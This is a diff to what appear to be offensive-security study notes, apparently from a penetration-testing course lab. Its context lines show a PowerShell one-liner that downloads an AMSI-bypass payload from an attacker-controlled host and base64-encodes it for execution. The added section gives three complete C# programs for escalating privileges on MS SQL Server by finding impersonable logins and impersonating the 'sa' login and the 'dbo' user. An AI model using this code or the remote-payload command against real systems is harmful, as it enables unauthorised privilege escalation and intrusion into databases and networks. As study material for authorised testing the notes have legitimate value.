@@ -206,3 +206,168 @@ $command = "(Invoke-RestMethod -Uri 'http://${lHost}/PayloadAmsi.ps1' -UseBasicP
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedText = [Convert]::ToBase64String($bytes)
 ```
+
+## Escalating privileges
+
+### Impersonation
+
+The MS SQL `EXECUTE AS` statement allows us to impersonate users at the `LOGIN`
+level with the `EXECUTE AS LOGIN` statement, and allows us to impersonate users
+within a database at the `USER` level with the `EXECUTE AS USER` statement.
+
+We can use the following C# .NET code to find logins that can be impersonated:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main()
+        {
+            string sqlServer = "dc01.corp1.com";
+            string database = "master";
+            string conString = "Server = " + sqlServer +
+                               "; Database = " + database +
+                               "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            string query =
+                "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
+            SqlCommand command = new SqlCommand(query, con);
+            SqlDataReader reader = command.ExecuteReader();
+            while (reader.Read() == true)
+            {
+                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
+            }
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+The following C# .NET code demonstrates how to impersonate the login of the `sa`
+system administrator user:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main()
+        {
+            string sqlServer = "dc01.corp1.com";
+            string database = "master";
+            string conString = "Server = " + sqlServer +
+                               "; Database = " + database +
+                               "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            string querylogin = "SELECT SYSTEM_USER;";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            string executeas = "EXECUTE AS LOGIN = 'sa';";
+            command = new SqlCommand(executeas, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            querylogin = "SELECT SYSTEM_USER;";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
+
+The following C# .NET code demonstrates how to impersonate the `dbo` user:
+
+```csharp
+using System;
+using System.Data.SqlClient;
+
+namespace SQL
+{
+    class Program
+    {
+        static void Main()
+        {
+            string sqlServer = "dc01.corp1.com";
+            string database = "master";
+            string conString = "Server = " + sqlServer +
+                               "; Database = " + database +
+                               "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+            string querylogin = "SELECT USER_NAME();";
+            SqlCommand command = new SqlCommand(querylogin, con);
+            SqlDataReader reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            string executeas = "use msdb; EXECUTE AS USER = 'dbo';";
+            command = new SqlCommand(executeas, con);
+            reader = command.ExecuteReader();
+            reader.Close();
+
+            querylogin = "SELECT USER_NAME();";
+            command = new SqlCommand(querylogin, con);
+            reader = command.ExecuteReader();
+            reader.Read();
+            Console.WriteLine("Logged in as: " + reader[0]);
+            reader.Close();
+
+            con.Close();
+        }
+    }
+}
+```
